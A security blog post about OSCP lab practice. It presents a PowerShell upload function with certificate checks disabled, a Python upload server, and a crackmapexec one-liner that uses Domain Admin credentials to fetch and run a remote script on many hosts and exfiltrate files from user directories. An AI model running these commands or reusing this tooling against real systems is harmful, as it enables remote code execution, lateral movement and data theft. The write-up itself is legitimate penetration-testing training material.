---
title: "Lazy file exfiltration for OSCP labs with powershell python and crackmapexec"
date: 2024-02-08T15:34:30-06:00
categories:
  - blog
tags:
  - exfiltration
  - python
  - powershell
  - OSCP
---
<b>Lazy is good when the result is that lazy becomes affordable.</b>
<br><a target="_new" href=https://github.com/jeamajoal/lazy_pwshpy_exfiltrator>Skip to the code.</a>

<b>Background:</b><br>
While diving into OSCP labs, I found myself searching through disk contents for clues. Although I'm adept at using the command line, sometimes the ease of navigating folders visually is preferable. Missing crucial details in a lab, likely from being tired, made me decide to find a better solution to avoid such misses.

<b>The Idea:</b><br>
My plan was to automate a simple yet effective process. The goal was to filter and exfiltrate files to a web server where I could easily sift through them. Simplicity was the cornerstone.

<b>Solution:</b><br>
I opted for a Powershell script utilizing Get-ChildItem with a -Filter parameter, coupled with the System.Net.Webclient class for exfiltration. I discovered a Python3 web server by another creator that fit my initial needs and decided to build upon it. Credit to the original creator: <a target="_new" href=https://edepree.com/2014/10/18/lightweight-http-upload-server.html>Lightweight HTTP Upload Server</a>.

<b>Challenge:</b><br>
I needed more than just dumping files into a single folder; I wanted them organized. This meant enhancing the server to handle additional data from my script for better file management.

<b>Check It Out:</b><br>
See the current version on GitHub: <a target="_new" href=https://github.com/jeamajoal/lazy_pwshpy_exfiltrator>Jeamajoal's Lazy PwshPy Exfiltrator</a>. The Powershell script's core functionality is in the upload function, where it sends file data along with the file path, so the server knows where to place the files.

<b>Powershell snippet for uploading files:</b><br>

```powershell

function UploadToWebServer($filepath, $url) {
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;
        $filename = Split-Path $FilePath -Leaf
        $boundary = [System.Guid]::NewGuid().ToString()

        $TheFile = [System.IO.File]::ReadAllBytes($filePath)
        $TheFileContent = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($TheFile)

        $id = $env:computername

        $LF = "`r`n"
        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"path`"$LF",
            $(Split-Path $FilePath),
            "--$boundary",
            "Content-Disposition: form-data; name=`"id`"$LF",
            $id,
            "--$boundary",
            "Content-Disposition: form-data; name=`"filename`"; filename=`"$filename`"",
            "Content-Type: application/json$LF",
            $TheFileContent,
            "--$boundary--$LF"
        ) -join $LF

        Invoke-RestMethod $url -Method POST -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
    }
    
```

<b>Python server side for handling the data:</b><br>

```python
def deal_post_data(self):
        global serverpath 
        line = b'' #Initialize line data as byte
        file_data = b''  # Initialize file_data as an empty byte string
        in_file_data = False #Initialize in file as boolean
        content_type = self.headers['content-type']
        if not content_type:
            return (False, "Content-Type header doesn't contain boundary")
        boundary = content_type.split("=")[1]
        boundary = boundary.replace('"','').encode()
        end_boundary = boundary + b"--"
        totalbytes = int(self.headers['content-length'])
        remainbytes = totalbytes
        #modify serverpath with alternate upload dir  
        if uDir:
            serverpath = os.path.join(os.getcwd(),uDir)
        else:
            serverpath = os.getcwd()
   
        #Process request
        while remainbytes > 0:
            line = self.rfile.readline()
            remainbytes -= len(line)

            if in_file_data:
                if boundary in line:
                    in_file_data = False
                    file_data = file_data[:-2]  # Remove the last CRLF before boundary
                    if end_boundary in line:
                        break  # End of data
                else:
                    file_data += line
                    continue

            if end_boundary in line:
                        break  # End of data
            if boundary in line:
                line = self.rfile.readline()
                remainbytes -= len(line)
                id = re.findall(r'Content-Disposition.*name="id"', line.decode())
                reqpath = re.findall(r'Content-Disposition.*name="path"', line.decode())
                fn = re.findall(r'Content-Disposition.*name="filename"; filename="(.*)"', line.decode())
                if fn:
                    in_file_data = True
                    file_name = re.findall(r'Content-Disposition.*name="filename"; filename="(.*)"', line.decode())
                    file_data = file_data[:-2]
                    line = self.rfile.readline()
                    remainbytes -= len(line)
                    line = self.rfile.readline()
                    remainbytes -= len(line)

                elif reqpath:
                    line = self.rfile.readline()
                    remainbytes -= len(line)
                    line = self.rfile.readline()
                    remainbytes -= len(line)
                    reqpath = line
                    ip_address = self.client_address[0]
                    #remove \r\n
                    reqpathstr = reqpath.decode()
                    reqpathstr = reqpathstr.replace("\r","")
                    reqpathstr = reqpathstr.replace("\n","")
                    if reqpathstr.startswith('/') or reqpathstr.startswith('\\'):
                        reqpathstr = reqpathstr.strip('/')
                        reqpathstr = reqpathstr.strip('\\')
                    reqpathstr = reqpathstr.replace('\\','/')
                    reqpathstr = reqpathstr.replace('\\','/')
                    reqpathstr = reqpathstr.replace('//','/')
                    reqpathstr = reqpathstr.replace(':','')
                    reqpathstr = os.path.join(ip_address,reqpathstr)
                    finalpath = os.path.join(serverpath,reqpathstr)

                elif id:
                    #print(line)
                    line = self.rfile.readline()
                    #print(line)
                    remainbytes -= len(line)
                    line = self.rfile.readline()
                    #print(line)
                    remainbytes -= len(line)
                    line = line.decode()
                    line = line.replace("\r","")
                    line = line.replace("\n","")
                    newid = line
                    
        if finalpath:
            serverpath = finalpath                    
        
        if newid:
            serverpath = serverpath.replace(ip_address,newid)

        serverpath = serverpath.lower()
        if not os.path.exists(serverpath):
            os.makedirs(serverpath)

        fn = os.path.join(serverpath, file_name[0])
        #print(f'Final upload path: {serverpath}')
        try:
            with open(fn, 'wb') as out:
                out.write(file_data)
            return ('succeeded',self.client_address,fn )
        except:
            return ('Failed',self.client_address,fn )
```

<b>The Fun Part:</b>

Start your postserver.py
We set the ip, port, and relative upload directory. (I serve files from the curent directory and upload to a sub-directory)

```shell
python3 python/postserver.py -b 0.0.0.0 -p 8443 -u uploads
```
This blog talks about mass exfiltration so we will assume you are like me and just have to run this once you find Domain Admin creds becasue you just want to see it happen. :)
We will use crackmapexec to source the upload.ps1 from our server and run it. This command is looking for the proofs but in the OSCP labs i use this as an initial peek into the Users directory on Windows boxes becasue from my experience offsec likes to put the juicy there or the root of the drive.

```shell
crackmapexec smb $(cat nodes.txt) -u DomainAdminUser -p DAPassword -x 'powershell.exe -command "iex (iwr http://192.168.45.242:8443/tools/upload.ps1 -usebasicparsing);exfil -dir c:\users\ -recurse -include \"*local.txt,*proof.txt\" -url http://192.168.45.242:8443 "'
```
<b>LOOT!!!</b>
![Loot Flows In](/_posts/res/PostServer.png?raw=true)



